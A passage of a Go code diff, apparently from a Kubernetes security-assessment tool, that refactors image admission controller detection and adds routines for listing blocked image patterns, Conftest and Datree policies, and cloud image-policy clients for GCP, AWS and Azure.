 			// Use SDK for more accurate matching to avoid false positives
-			if MatchesEngineWebhook(name, "clair") {
+			if admission.MatchesEngineWebhook(name, "clair") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4441,7 +5405,7 @@ func analyzeClair(ctx context.Context, clientset kubernetes.Interface, dynClient
 
 	// Verify Clair pods are running using SDK for consistent detection
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("clair"), "", "clair")
+		admission.GetExpectedNamespaces("clair"), "", "clair")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4449,7 +5413,6 @@ func analyzeClair(ctx context.Context, clientset kubernetes.Interface, dynClient
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4471,7 +5434,7 @@ func analyzeWiz(ctx context.Context, clientset kubernetes.Interface, dynClient d
 	if err == nil {
 		for _, wh := range whList.Items {
 			name := wh.GetName()
-			if MatchesEngineWebhook(name, "wiz") {
+			if admission.MatchesEngineWebhook(name, "wiz") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4499,7 +5462,7 @@ func analyzeWiz(ctx context.Context, clientset kubernetes.Interface, dynClient d
 
 	// Verify Wiz pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("wiz"), "app.kubernetes.io/name=wiz-sensor", "wiz")
+		admission.GetExpectedNamespaces("wiz"), "app.kubernetes.io/name=wiz-sensor", "wiz")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4507,7 +5470,6 @@ func analyzeWiz(ctx context.Context, clientset kubernetes.Interface, dynClient d
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4529,7 +5491,7 @@ func analyzeLacework(ctx context.Context, clientset kubernetes.Interface, dynCli
 	if err == nil {
 		for _, wh := range whList.Items {
 			name := wh.GetName()
-			if MatchesEngineWebhook(name, "lacework") {
+			if admission.MatchesEngineWebhook(name, "lacework") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4557,7 +5519,7 @@ func analyzeLacework(ctx context.Context, clientset kubernetes.Interface, dynCli
 
 	// Verify Lacework pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("lacework"), "", "lacework")
+		admission.GetExpectedNamespaces("lacework"), "", "lacework")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4565,7 +5527,6 @@ func analyzeLacework(ctx context.Context, clientset kubernetes.Interface, dynCli
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4618,7 +5579,7 @@ func analyzeCosignStandalone(ctx context.Context, clientset kubernetes.Interface
 
 	// Verify Cosign pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("cosign"), "", "cosign")
+		admission.GetExpectedNamespaces("cosign"), "", "cosign")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4626,7 +5587,6 @@ func analyzeCosignStandalone(ctx context.Context, clientset kubernetes.Interface
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4660,7 +5620,7 @@ func analyzeFluxImageAutomation(ctx context.Context, clientset kubernetes.Interf
 
 	// Verify Flux Image controllers are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("flux-image"), "app=image-automation-controller", "flux-image")
+		admission.GetExpectedNamespaces("flux-image"), "app=image-automation-controller", "flux-image")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4668,7 +5628,6 @@ func analyzeFluxImageAutomation(ctx context.Context, clientset kubernetes.Interf
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "CRDs-only"
-		controller.BypassRisk = "CRDs found but no running controllers"
 	}
 
 	// Get image policies
@@ -4757,7 +5716,7 @@ func analyzeJFrogXray(ctx context.Context, clientset kubernetes.Interface, dynCl
 
 	// Verify Xray pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("jfrog-xray"), "", "jfrog-xray")
+		admission.GetExpectedNamespaces("jfrog-xray"), "", "jfrog-xray")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4765,7 +5724,6 @@ func analyzeJFrogXray(ctx context.Context, clientset kubernetes.Interface, dynCl
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4787,7 +5745,7 @@ func analyzeDeepfence(ctx context.Context, clientset kubernetes.Interface, dynCl
 	if err == nil {
 		for _, wh := range whList.Items {
 			name := wh.GetName()
-			if MatchesEngineWebhook(name, "deepfence") {
+			if admission.MatchesEngineWebhook(name, "deepfence") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4815,7 +5773,7 @@ func analyzeDeepfence(ctx context.Context, clientset kubernetes.Interface, dynCl
 
 	// Verify Deepfence pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("deepfence"), "", "deepfence")
+		admission.GetExpectedNamespaces("deepfence"), "", "deepfence")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4823,7 +5781,6 @@ func analyzeDeepfence(ctx context.Context, clientset kubernetes.Interface, dynCl
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4845,7 +5802,7 @@ func analyzeQualys(ctx context.Context, clientset kubernetes.Interface, dynClien
 	if err == nil {
 		for _, wh := range whList.Items {
 			name := wh.GetName()
-			if MatchesEngineWebhook(name, "qualys") {
+			if admission.MatchesEngineWebhook(name, "qualys") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4873,7 +5830,7 @@ func analyzeQualys(ctx context.Context, clientset kubernetes.Interface, dynClien
 
 	// Verify Qualys pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("qualys"), "", "qualys")
+		admission.GetExpectedNamespaces("qualys"), "", "qualys")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4881,7 +5838,6 @@ func analyzeQualys(ctx context.Context, clientset kubernetes.Interface, dynClien
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -4904,7 +5860,7 @@ func analyzeDockerScout(ctx context.Context, clientset kubernetes.Interface, dyn
 	if err == nil {
 		for _, wh := range whList.Items {
 			name := wh.GetName()
-			if MatchesEngineWebhook(name, "docker-scout") {
+			if admission.MatchesEngineWebhook(name, "docker-scout") {
 				if !webhookTargetsWorkloads(wh.Object) {
 					continue
 				}
@@ -4932,7 +5888,7 @@ func analyzeDockerScout(ctx context.Context, clientset kubernetes.Interface, dyn
 
 	// Verify Docker Scout pods are running
 	podsRunning, ns, imageVerified := verifyPodsRunningWithImage(ctx, clientset,
-		GetExpectedNamespaces("docker-scout"), "", "docker-scout")
+		admission.GetExpectedNamespaces("docker-scout"), "", "docker-scout")
 
 	if podsRunning {
 		controller.Status = "active"
@@ -4940,7 +5896,6 @@ func analyzeDockerScout(ctx context.Context, clientset kubernetes.Interface, dyn
 		controller.ImageVerified = imageVerified
 	} else {
 		controller.Status = "webhook-only"
-		controller.BypassRisk = "Webhook exists but no running pods found"
 	}
 
 	return controller, policies
@@ -5214,7 +6169,6 @@ func analyzePolicyEffectiveness(
 		}
 		if !covered {
 			analysis.UncoveredRegistries = append(analysis.UncoveredRegistries, registry)
-			usage.RiskLevel = "HIGH"
 		}
 	}
 
@@ -5980,9 +6934,6 @@ gcloud container binauthz attestations list --attestor=<attestor-name>`,
 	for _, f := range policyEngineFindings {
 		if f.Policy == "allow" || strings.ToLower(f.Policy) == "audit" || f.Repository != "" {
 			conditions := fmt.Sprintf("Policy action: %s", f.Policy)
-			if f.BypassRisk != "" {
-				conditions += fmt.Sprintf("; %s", f.BypassRisk)
-			}
 			if f.SignatureReq == "Yes" {
 				conditions += "; Signature required"
 			}
@@ -6007,6 +6958,260 @@ gcloud container binauthz attestations list --attestor=<attestor-name>`,
 				SignatureRequired: f.SignatureReq == "Yes",
 				Conditions:        conditions,
 				DeployCommand:     fmt.Sprintf("# Pattern: %s", pattern),
+			})
+		}
+	}
+
+	return entries
+}
+
+// extractBlockedImages extracts all blocked/denied image patterns from detected policies
+// This shows what images are explicitly blacklisted and cannot be deployed
+func extractBlockedImages(
+	controllers []ImageAdmissionController,
+	portierisPolicies []PortierisPolicy,
+	connaisseurPolicies []ConnaisseurPolicy,
+	sigstorePolicies []SigstorePolicy,
+	kritisPolicies []KritisPolicy,
+	aquaPolicies []AquaSecurityPolicy,
+	prismaPolicies []PrismaCloudPolicy,
+	sysdigPolicies []SysdigSecurePolicy,
+	neuvectorPolicies []NeuVectorPolicy,
+	anchorePolicies []AnchorePolicy,
+	stackroxPolicies []StackRoxPolicy,
+	snykPolicies []SnykContainerPolicy,
+	trivyPolicies []TrivyOperatorPolicy,
+	policyEngineFindings []ImagePolicyFinding,
+) []BlockedImageEntry {
+	var entries []BlockedImageEntry
+
+	// If no controllers, nothing is blocked
+	if len(controllers) == 0 {
+		return entries
+	}
+
+	// Check for GCP Binary Authorization blocking
+	for _, c := range controllers {
+		if c.Type == "gcp-binauth" {
+			// Binary Auth typically denies by default if attestation is required
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "GCP Binary Authorization",
+				PolicyName:     "Default Deny",
+				Scope:          "cluster",
+				BlockedPattern: "*",
+				Reason:         "Images without attestation are blocked by default",
+				Effect:         "deny",
+				SourceResource: fmt.Sprintf("ValidatingWebhookConfiguration/%s", c.WebhookName),
+			})
+		}
+	}
+
+	// Extract denies from Portieris policies
+	for _, policy := range portierisPolicies {
+		for _, repo := range policy.Repositories {
+			if repo.Policy == "deny" || repo.Policy == "reject" {
+				scope := "namespace"
+				var namespaces []string
+				if policy.IsClusterPolicy {
+					scope = "cluster"
+				} else {
+					namespaces = append(namespaces, policy.Namespace)
+				}
+
+				entries = append(entries, BlockedImageEntry{
+					Controller:     "Portieris",
+					PolicyName:     policy.Name,
+					Scope:          scope,
+					Namespaces:     namespaces,
+					BlockedPattern: repo.Name,
+					Reason:         "Explicitly denied in policy",
+					Effect:         "deny",
+				})
+			}
+		}
+	}
+
+	// Extract denies from Connaisseur policies
+	for _, policy := range connaisseurPolicies {
+		if policy.Rule == "deny" || policy.Rule == "reject" {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Connaisseur",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: policy.Pattern,
+				Reason:         "Explicitly denied in policy",
+				Effect:         "deny",
+			})
+		}
+	}
+
+	// Extract from Sigstore policies (reject mode)
+	for _, policy := range sigstorePolicies {
+		if policy.Mode == "reject" || policy.Mode == "enforce" {
+			// In enforce/reject mode, unsigned images are blocked
+			for _, img := range policy.Images {
+				entries = append(entries, BlockedImageEntry{
+					Controller:     "Sigstore Policy Controller",
+					PolicyName:     policy.Name,
+					Scope:          "cluster",
+					BlockedPattern: fmt.Sprintf("%s (unsigned)", img),
+					Reason:         "Images without valid signatures are rejected",
+					Effect:         "deny",
+				})
+			}
+		}
+	}
+
+	// Extract from Aqua Security policies
+	for _, policy := range aquaPolicies {
+		if policy.BlockUnregistered {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Aqua Security",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: "* (unregistered)",
+				Reason:         "Unregistered images are blocked",
+				Effect:         "deny",
+			})
+		}
+		if policy.BlockMalware {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Aqua Security",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: "* (malware detected)",
+				Reason:         "Images with malware are blocked",
+				Effect:         "deny",
+			})
+		}
+		if policy.CVSSThreshold > 0 {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Aqua Security",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: fmt.Sprintf("* (CVSS > %.1f)", policy.CVSSThreshold),
+				Reason:         fmt.Sprintf("Images with vulnerabilities above CVSS %.1f are blocked", policy.CVSSThreshold),
+				Effect:         "deny",
+			})
+		}
+	}
+
+	// Extract from Prisma Cloud policies
+	for _, policy := range prismaPolicies {
+		if policy.BlockMalware {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Prisma Cloud",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: "* (malware detected)",
+				Reason:         "Images with malware are blocked",
+				Effect:         "deny",
+			})
+		}
+		if policy.BlockThreshold != "" {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Prisma Cloud",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: fmt.Sprintf("* (%s+ severity)", policy.BlockThreshold),
+				Reason:         fmt.Sprintf("Images with %s+ severity vulnerabilities are blocked", policy.BlockThreshold),
+				Effect:         "deny",
+			})
+		}
+	}
+
+	// Extract from Sysdig Secure policies
+	for _, policy := range sysdigPolicies {
+		if policy.BlockOnFailure {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Sysdig Secure",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: "* (scan failed)",
+				Reason:         "Images that fail scanning are blocked",
+				Effect:         "deny",
+			})
+		}
+		if policy.CVSSThreshold > 0 {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Sysdig Secure",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: fmt.Sprintf("* (CVSS > %.1f)", policy.CVSSThreshold),
+				Reason:         fmt.Sprintf("Images with vulnerabilities above CVSS %.1f are blocked", policy.CVSSThreshold),
+				Effect:         "deny",
+			})
+		}
+	}
+
+	// Extract from NeuVector policies
+	for _, policy := range neuvectorPolicies {
+		if policy.Mode == "Protect" {
+			if policy.BlockHighCVE {
+				entries = append(entries, BlockedImageEntry{
+					Controller:     "NeuVector",
+					PolicyName:     policy.Name,
+					Scope:          "namespace",
+					Namespaces:     []string{policy.Namespace},
+					BlockedPattern: "* (high CVE)",
+					Reason:         "Images with high CVE vulnerabilities are blocked in Protect mode",
+					Effect:         "deny",
+				})
+			}
+			// Add denied registries
+			for _, reg := range policy.DeniedRegistries {
+				entries = append(entries, BlockedImageEntry{
+					Controller:     "NeuVector",
+					PolicyName:     policy.Name,
+					Scope:          "namespace",
+					Namespaces:     []string{policy.Namespace},
+					BlockedPattern: reg + "/*",
+					Reason:         "Registry is on deny list",
+					Effect:         "deny",
+				})
+			}
+		}
+	}
+
+	// Extract from StackRox policies
+	for _, policy := range stackroxPolicies {
+		if policy.EnforcementAction == "SCALE_TO_ZERO_DEPLOYMENT" || policy.EnforcementAction == "FAIL_BUILD_ENFORCEMENT" {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "StackRox/RHACS",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: "* (policy violation)",
+				Reason:         fmt.Sprintf("Severity: %s, Action: %s", policy.Severity, policy.EnforcementAction),
+				Effect:         "deny",
+			})
+		}
+	}
+
+	// Extract from Trivy Operator policies
+	for _, policy := range trivyPolicies {
+		if policy.SeverityThreshold != "" {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     "Trivy Operator",
+				PolicyName:     policy.Name,
+				Scope:          "cluster",
+				BlockedPattern: fmt.Sprintf("* (%s+ severity)", policy.SeverityThreshold),
+				Reason:         fmt.Sprintf("Images with %s+ severity vulnerabilities flagged", policy.SeverityThreshold),
+				Effect:         "audit", // Trivy typically audits rather than blocks
+			})
+		}
+	}
+
+	// Extract from policy engine findings (Kyverno/Gatekeeper deny rules)
+	for _, finding := range policyEngineFindings {
+		if strings.ToLower(finding.Policy) == "deny" || strings.Contains(strings.ToLower(finding.Policy), "block") {
+			entries = append(entries, BlockedImageEntry{
+				Controller:     finding.Controller,
+				PolicyName:     finding.PolicyName,
+				Scope:          finding.Scope,
+				Namespaces:     []string{finding.Namespace},
+				BlockedPattern: finding.Repository,
+				Reason:         "Policy rule denies this pattern",
+				Effect:         "deny",
 			})
 		}
 	}
@@ -6089,7 +7294,7 @@ func verifyPodsRunning(ctx context.Context, clientset kubernetes.Interface, name
 // verifyPodsRunningWithImage checks if pods are running AND verifies their images match known patterns
 func verifyPodsRunningWithImage(ctx context.Context, clientset kubernetes.Interface, namespaces []string, labelSelector string, controllerType string) (bool, string, bool) {
 	// Use SDK-based verification for consistent detection across all modules
-	podsRunning, runningNS, imageVerified, _, _ := VerifyPodsRunningWithSDK(ctx, clientset, namespaces, labelSelector, controllerType)
+	podsRunning, runningNS, imageVerified, _, _ := admission.VerifyPodsRunning(ctx, clientset, namespaces, labelSelector, controllerType)
 	return podsRunning, runningNS, imageVerified
 }
 
@@ -6114,4 +7319,726 @@ func matchesPattern(registry, pattern string) bool {
 
 	// Exact match
 	return registry == pattern || strings.HasPrefix(registry, pattern+"/")
+}
+
+// ============================================================================
+// Conftest Image Policy Analysis
+// ============================================================================
+
+// ConftestImagePolicyInfo represents Conftest policies for container images
+type ConftestImagePolicyInfo struct {
+	Name           string
+	Namespace      string
+	PolicyPath     string
+	TargetImages   []string
+	Failures       int
+	Warnings       int
+	Successes      int
+}
+
+// analyzeConftestImagePolicies analyzes Conftest for image-related policies
+func analyzeConftestImagePolicies(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []ConftestImagePolicyInfo) {
+	controller := ImageAdmissionController{
+		Name: "Conftest",
+		Type: "policy-engine",
+	}
+	var policies []ConftestImagePolicyInfo
+
+	// Check for Conftest deployment
+	namespaces := []string{"conftest", "kube-system", "opa-system"}
+
+	for _, ns := range namespaces {
+		deployments, err := clientset.AppsV1().Deployments(ns).List(ctx, metav1.ListOptions{})
+		if err != nil {
+			continue
+		}
+
+		for _, dep := range deployments.Items {
+			if strings.Contains(strings.ToLower(dep.Name), "conftest") {
+				controller.Status = "active"
+				controller.Namespace = ns
+
+				// Verify by image
+				for _, container := range dep.Spec.Template.Spec.Containers {
+					if strings.Contains(container.Image, "conftest") ||
+						strings.Contains(container.Image, "openpolicyagent") {
+						controller.ImageVerified = true
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// Check for Conftest ValidatingWebhookConfiguration
+	webhooks, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, wh := range webhooks.Items {
+			if strings.Contains(strings.ToLower(wh.Name), "conftest") {
+				controller.WebhookName = wh.Name
+				if len(wh.Webhooks) > 0 {
+					controller.FailurePolicy = string(*wh.Webhooks[0].FailurePolicy)
+				}
+				break
+			}
+		}
+	}
+
+	// Check for ConfigMaps with Conftest policies
+	configMaps, err := clientset.CoreV1().ConfigMaps("").List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, cm := range configMaps.Items {
+			// Look for ConfigMaps with rego policies that might be for Conftest
+			for key, data := range cm.Data {
+				if strings.HasSuffix(key, ".rego") &&
+					(strings.Contains(data, "deny[") || strings.Contains(data, "violation[")) {
+
+					// Check if the policy is image-related
+					if strings.Contains(data, "image") ||
+						strings.Contains(data, "container") ||
+						strings.Contains(data, "registry") {
+						policy := ConftestImagePolicyInfo{
+							Name:       cm.Name + "/" + key,
+							Namespace:  cm.Namespace,
+							PolicyPath: key,
+						}
+
+						// Try to extract target images from policy
+						if strings.Contains(data, "allowed_registries") ||
+							strings.Contains(data, "trusted_registries") ||
+							strings.Contains(data, "image_registry") {
+							policy.TargetImages = append(policy.TargetImages, "registry-restriction")
+						}
+
+						policies = append(policies, policy)
+					}
+				}
+			}
+		}
+	}
+
+	return controller, policies
+}
+
+// ============================================================================
+// Datree Image Policy Analysis
+// ============================================================================
+
+// DatreeImagePolicyInfo represents Datree policies for container images
+type DatreeImagePolicyInfo struct {
+	Name         string
+	Namespace    string
+	PolicyName   string
+	RuleCount    int
+	ImageRules   []string
+	Enforcement  string // enforce, monitor
+}
+
+// analyzeDatreeImagePolicies analyzes Datree for image-related policies
+func analyzeDatreeImagePolicies(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []DatreeImagePolicyInfo) {
+	controller := ImageAdmissionController{
+		Name: "Datree",
+		Type: "policy-engine",
+	}
+	var policies []DatreeImagePolicyInfo
+
+	// Check for Datree deployment
+	namespaces := []string{"datree", "kube-system"}
+
+	for _, ns := range namespaces {
+		deployments, err := clientset.AppsV1().Deployments(ns).List(ctx, metav1.ListOptions{})
+		if err != nil {
+			continue
+		}
+
+		for _, dep := range deployments.Items {
+			if strings.Contains(strings.ToLower(dep.Name), "datree") {
+				controller.Status = "active"
+				controller.Namespace = ns
+
+				// Verify by image
+				for _, container := range dep.Spec.Template.Spec.Containers {
+					if strings.Contains(container.Image, "datree") {
+						controller.ImageVerified = true
+						break
+					}
+				}
+			}
+		}
+	}
+
+	// Check for Datree ValidatingWebhookConfiguration
+	webhooks, err := clientset.AdmissionregistrationV1().ValidatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, wh := range webhooks.Items {
+			if strings.Contains(strings.ToLower(wh.Name), "datree") {
+				controller.WebhookName = wh.Name
+				if len(wh.Webhooks) > 0 {
+					controller.FailurePolicy = string(*wh.Webhooks[0].FailurePolicy)
+				}
+				break
+			}
+		}
+	}
+
+	// Check Datree ConfigMap for policy configuration
+	configMaps, err := clientset.CoreV1().ConfigMaps("").List(ctx, metav1.ListOptions{
+		LabelSelector: "app=datree-webhook",
+	})
+	if err == nil {
+		for _, cm := range configMaps.Items {
+			policy := DatreeImagePolicyInfo{
+				Name:      cm.Name,
+				Namespace: cm.Namespace,
+			}
+
+			// Check for policy name in data
+			if policyName, ok := cm.Data["policyName"]; ok {
+				policy.PolicyName = policyName
+			}
+
+			// Datree image-related rules to look for
+			imageRules := []string{
+				"CONTAINERS_MISSING_IMAGE_VALUE_VERSION",
+				"CONTAINERS_INCORRECT_IMAGEPULLPOLICY_VALUE",
+				"CONTAINERS_MISSING_IMAGEPULLPOLICY_KEY",
+				"CONTAINERS_INCORRECT_IMAGE_TAG",
+			}
+
+			for _, rule := range imageRules {
+				if _, ok := cm.Data[rule]; ok {
+					policy.ImageRules = append(policy.ImageRules, rule)
+				}
+			}
+
+			// Check for enforcement mode
+			if enforcement, ok := cm.Data["enforcement"]; ok {
+				policy.Enforcement = enforcement
+			} else {
+				policy.Enforcement = "enforce" // default
+			}
+
+			policies = append(policies, policy)
+		}
+	}
+
+	// Also check for Datree CRDs if they exist
+	policyGVR := schema.GroupVersionResource{
+		Group:    "datree.io",
+		Version:  "v1",
+		Resource: "policies",
+	}
+
+	policyList, err := dynClient.Resource(policyGVR).List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, p := range policyList.Items {
+			policy := DatreeImagePolicyInfo{
+				Name:      p.GetName(),
+				Namespace: p.GetNamespace(),
+			}
+
+			if spec, ok := p.Object["spec"].(map[string]interface{}); ok {
+				if policyName, ok := spec["policyName"].(string); ok {
+					policy.PolicyName = policyName
+				}
+				if rules, ok := spec["rules"].([]interface{}); ok {
+					policy.RuleCount = len(rules)
+					for _, r := range rules {
+						if rMap, ok := r.(map[string]interface{}); ok {
+							if id, ok := rMap["identifier"].(string); ok {
+								if strings.Contains(strings.ToUpper(id), "IMAGE") ||
+									strings.Contains(strings.ToUpper(id), "CONTAINER") {
+									policy.ImageRules = append(policy.ImageRules, id)
+								}
+							}
+						}
+					}
+				}
+			}
+
+			policies = append(policies, policy)
+		}
+	}
+
+	return controller, policies
+}
+
+// containsImageProvider checks if a provider is in the list
+func containsImageProvider(providers []string, target string) bool {
+	for _, p := range providers {
+		if strings.EqualFold(p, target) {
+			return true
+		}
+	}
+	return false
+}
+
+// initImageAdmissionCloudClients initializes cloud provider clients for image admission
+func initImageAdmissionCloudClients(logger internal.Logger) *ImageAdmissionCloudClients {
+	if len(globals.K8sCloudProviders) == 0 {
+		logger.InfoM("Cloud image policy enumeration disabled (use --cloud-provider to enable)", K8S_IMAGE_ADMISSION_MODULE_NAME)
+		return nil
+	}
+
+	clients := &ImageAdmissionCloudClients{}
+	cloudEnabled := false
+
+	// GCP Binary Authorization
+	if containsImageProvider(globals.K8sCloudProviders, "gcp") {
+		svc, err := binaryauthorization.NewService(context.Background(), option.WithScopes(binaryauthorization.CloudPlatformScope))
+		if err == nil {
+			clients.GCPBinaryAuthService = svc
+
+			if len(globals.K8sGCPProjects) > 0 {
+				clients.GCPProjects = globals.K8sGCPProjects
+				logger.InfoM(fmt.Sprintf("GCP Binary Authorization enabled (%d projects)", len(globals.K8sGCPProjects)), K8S_IMAGE_ADMISSION_MODULE_NAME)
+				cloudEnabled = true
+			} else {
+				logger.InfoM("GCP Binary Authorization enabled (no projects specified, will try to discover)", K8S_IMAGE_ADMISSION_MODULE_NAME)
+				cloudEnabled = true
+			}
+		} else {
+			logger.InfoM(fmt.Sprintf("GCP Binary Authorization failed: %v", err), K8S_IMAGE_ADMISSION_MODULE_NAME)
+		}
+	}
+
+	// AWS ECR and Signer
+	if containsImageProvider(globals.K8sCloudProviders, "aws") {
+		var awsCfg aws.Config
+		var err error
+		if globals.K8sAWSProfile != "" {
+			awsCfg, err = awsconfig.LoadDefaultConfig(context.Background(),
+				awsconfig.WithSharedConfigProfile(globals.K8sAWSProfile))
+		} else {
+			awsCfg, err = awsconfig.LoadDefaultConfig(context.Background())
+		}
+		if err == nil {
+			clients.AWSECRClient = ecr.NewFromConfig(awsCfg)
+			clients.AWSSignerClient = signer.NewFromConfig(awsCfg)
+			clients.AWSRegion = awsCfg.Region
+			if awsCfg.Region != "" {
+				logger.InfoM(fmt.Sprintf("AWS ECR/Signer enabled (region: %s)", awsCfg.Region), K8S_IMAGE_ADMISSION_MODULE_NAME)
+				cloudEnabled = true
+			}
+		} else {
+			logger.InfoM(fmt.Sprintf("AWS ECR/Signer failed: %v", err), K8S_IMAGE_ADMISSION_MODULE_NAME)
+		}
+	}
+
+	// Azure Policy
+	if containsImageProvider(globals.K8sCloudProviders, "azure") {
+		azCred, err := azidentity.NewDefaultAzureCredential(nil)
+		if err == nil {
+			clients.AzureCredential = azCred
+
+			if len(globals.K8sAzureSubscriptions) > 0 {
+				clients.AzureSubscriptions = globals.K8sAzureSubscriptions
+				logger.InfoM(fmt.Sprintf("Azure Policy enabled (%d subscriptions)", len(globals.K8sAzureSubscriptions)), K8S_IMAGE_ADMISSION_MODULE_NAME)
+				cloudEnabled = true
+			} else {
+				logger.InfoM("Azure Policy enabled (no subscriptions specified, will try to discover)", K8S_IMAGE_ADMISSION_MODULE_NAME)
+				cloudEnabled = true
+			}
+		} else {
+			logger.InfoM(fmt.Sprintf("Azure Policy failed: %v", err), K8S_IMAGE_ADMISSION_MODULE_NAME)
+		}
+	}
+
+	if !cloudEnabled {
+		return nil
+	}
+
+	return clients
+}
+
+// analyzeGCPBinaryAuth fetches GCP Binary Authorization policies from the API
+func analyzeGCPBinaryAuth(ctx context.Context, clients *ImageAdmissionCloudClients, logger internal.Logger) ([]CloudImagePolicy, []GCPBinaryAuthAttestor) {
+	var policies []CloudImagePolicy
+	var attestors []GCPBinaryAuthAttestor
+
+	if clients == nil || clients.GCPBinaryAuthService == nil {
+		return policies, attestors
+	}
+
+	projects := clients.GCPProjects
+	if len(projects) == 0 {
+		// Try to discover projects - for now just log
+		logger.InfoM("No GCP projects specified, skipping Binary Authorization enumeration", K8S_IMAGE_ADMISSION_MODULE_NAME)
+		return policies, attestors
+	}
+
+	for _, project := range projects {
+		// Get project policy
+		policyName := fmt.Sprintf("projects/%s/policy", project)
+		policy, err := clients.GCPBinaryAuthService.Projects.GetPolicy(policyName).Context(ctx).Do()
+		if err != nil {
+			logger.InfoM(fmt.Sprintf("Failed to get Binary Auth policy for %s: %v", project, err), K8S_IMAGE_ADMISSION_MODULE_NAME)
+			continue
+		}
+
+		// Parse default admission rule
+		defaultAction := "ALLOW"
+		enforcementMode := "ENFORCED_BLOCK_AND_AUDIT_LOG"
+		attestorsCount := 0
+
+		if policy.DefaultAdmissionRule != nil {
+			defaultAction = policy.DefaultAdmissionRule.EvaluationMode
+			enforcementMode = policy.DefaultAdmissionRule.EnforcementMode
+			attestorsCount = len(policy.DefaultAdmissionRule.RequireAttestationsBy)
+		}
+
+		// Build exempt images list
+		var exemptImages []string
+		for _, img := range policy.AdmissionWhitelistPatterns {
+			exemptImages = append(exemptImages, img.NamePattern)
+		}
+
+		// Determine if this policy blocks deployment
+		// ENFORCED_BLOCK_AND_AUDIT_LOG with ALWAYS_DENY or REQUIRE_ATTESTATION blocks
+		blocksDeployment := false
+		if strings.Contains(enforcementMode, "ENFORCED") &&
+			(defaultAction == "ALWAYS_DENY" || defaultAction == "REQUIRE_ATTESTATION") {
+			blocksDeployment = true
+		}
+
+		// Determine policy details
+		details := fmt.Sprintf("Global: %s", policy.GlobalPolicyEvaluationMode)
+		if len(policy.ClusterAdmissionRules) > 0 {
